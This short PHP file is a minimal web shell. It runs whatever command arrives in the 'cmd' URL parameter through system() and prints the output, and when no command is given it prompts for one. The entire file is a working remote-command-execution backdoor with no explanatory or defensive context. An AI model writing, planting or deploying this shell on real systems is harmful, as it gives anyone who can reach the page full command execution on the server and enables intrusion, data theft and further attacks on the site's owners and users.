<?php
if (isset($_GET['cmd'])) 
{
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    die;
}
else {
    echo "Specify your CMD parameter";
}